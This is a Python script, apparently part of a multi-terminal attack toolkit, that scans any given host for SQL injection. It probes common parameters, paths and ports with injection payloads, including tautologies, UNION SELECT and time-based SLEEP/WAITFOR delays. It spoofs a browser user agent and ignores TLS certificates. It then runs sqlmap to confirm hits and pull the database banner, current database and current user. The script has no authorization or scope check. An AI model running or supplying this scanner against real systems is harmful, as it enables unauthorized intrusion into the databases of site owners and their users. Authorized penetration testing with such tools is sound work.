#!/usr/bin/env python3
"""TERMINAL 2: SQL Injection Testing with SQLMap Integration"""
import requests, sys, json, os, subprocess, urllib.parse
from datetime import datetime
import warnings
warnings.filterwarnings('ignore')

class Colors:
    HEADER, OKBLUE, OKCYAN, OKGREEN, WARNING, FAIL, ENDC, BOLD = '\033[95m', '\033[94m', '\033[96m', '\033[92m', '\033[93m', '\033[91m', '\033[0m', '\033[1m'

class SQLInjectionTester:
    def __init__(self, target, workspace="/tmp"):
        self.target, self.workspace = target, workspace
        self.results_file = f"{workspace}/results/sqli_scan.json"
        self.session = requests.Session()
        self.session.headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
        self.vulnerabilities = []
        self.error_patterns = ["sql syntax", "mysql_fetch", "ORA-", "PLS-", "Microsoft SQL Server",
            "ODBC SQL Server Driver", "PostgreSQL", "SQLite", "Warning: mysql", "unclosed quotation mark"]
        self.payloads = ["'", "' OR '1'='1", "' OR '1'='1' --", "' OR 1=1--", "';--", "' AND 1=1--",
            "' AND 1=2--", "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--", 
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", "1;WAITFOR DELAY '0:0:5'--"]
        self.test_params = ['id', 'page', 'cat', 'user', 'product', 'item', 'search', 'query']
        print(f"""{Colors.HEADER}\n╔══════════════════════════════════════════════════════════════════╗\n║         TERMINAL 2: SQL INJECTION TESTING (SQLMap + Manual)      ║\n╚══════════════════════════════════════════════════════════════════╝{Colors.ENDC}\nTarget: {target} | Payloads: {len(self.payloads)} | Params: {len(self.test_params)}""")

    def get_urls(self):
        urls = []
        for p in ['http', 'https']:
            for path in ['', '/', '/index.php', '/search', '/product', '/page', '/news', '/admin', '/login']:
                urls.append(f"{p}://{self.target}{path}")
        for port in [80, 443, 8080, 8443, 3000, 5000, 8000]:
            proto = 'https' if port in [443, 8443] else 'http'
            urls.append(f"{proto}://{self.target}:{port}")
        return urls

    def test_param(self, url, param, payload):
        try:
            test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
            r = self.session.get(test_url, timeout=15, verify=False, allow_redirects=False)
            text = r.text.lower()
            for pattern in self.error_patterns:
                if pattern.lower() in text:
                    return {'type': 'SQL Injection', 'url': test_url, 'param': param, 'payload': payload,
                        'evidence': f"Error: {pattern}", 'status': r.status_code, 'severity': 'High'}
            if 'SLEEP' in payload.upper() and r.elapsed.total_seconds() > 4:
                return {'type': 'SQL Injection (Time-Based)', 'url': test_url, 'param': param, 
                    'payload': payload, 'evidence': f"Delay: {r.elapsed.total_seconds():.2f}s",
                    'status': r.status_code, 'severity': 'High'}
        except: pass
        return None

    def run_sqlmap(self, url):
        print(f"\n{Colors.BOLD}[SQLMap] Testing: {url}{Colors.ENDC}")
        cmd = ['sqlmap', '-u', url, '--batch', '--level', '2', '--risk', '1', '--random-agent', '--threads', '5']
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            if 'is vulnerable' in result.stdout.lower():
                print(f"{Colors.FAIL}[!] SQLMap confirmed SQLi!{Colors.ENDC}")
                cmd2 = ['sqlmap', '-u', url, '--batch', '--banner', '--current-db', '--current-user', '--random-agent']
                r2 = subprocess.run(cmd2, capture_output=True, text=True, timeout=300)
                for line in r2.stdout.split('\n'):
                    if any(k in line for k in ['banner:', 'current database:', 'current user:']):
                        print(f"{Colors.OKGREEN}[+] {line.strip()}{Colors.ENDC}")
                return True
        except: pass
        return False

    def run(self):
        print(f"\n{Colors.BOLD}[PHASE 1] Manual SQLi Testing{Colors.ENDC}\n")
        for url in self.get_urls()[:5]:
            print(f"{Colors.OKBLUE}[*] Testing: {url}{Colors.ENDC}")
            for param in self.test_params:
                for payload in self.payloads[:10]:
                    result = self.test_param(url, param, payload)
                    if result:
                        self.vulnerabilities.append(result)
                        print(f"{Colors.FAIL}[!] SQL Injection Found!{Colors.ENDC}\n  URL: {result['url']}\n  Evidence: {result['evidence']}")
                        self.run_sqlmap(result['url'])
                        break
        
        print(f"\n{Colors.BOLD}[PHASE 2] Bulk SQLMap Scan{Colors.ENDC}")
        for url in self.get_urls()[:3]:
            self.run_sqlmap(f"{url}?id=1")
        
        os.makedirs(os.path.dirname(self.results_file), exist_ok=True)
        with open(self.results_file, 'w') as f:
            json.dump({'target': self.target, 'time': datetime.now().isoformat(), 
                'vulns': self.vulnerabilities, 'count': len(self.vulnerabilities)}, f, indent=2)
        print(f"{Colors.OKGREEN}[+] Results: {self.results_file}{Colors.ENDC}")
        print(f"{Colors.HEADER}{'='*60}{Colors.ENDC}\n{Colors.BOLD}SQL Injection Scan Complete{Colors.ENDC}\nFound: {len(self.vulnerabilities)}{Colors.ENDC}\n")

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: terminal2_sql.py <target>")
        sys.exit(1)
    SQLInjectionTester(sys.argv[1], sys.argv[2] if len(sys.argv) > 2 else "/tmp").run()
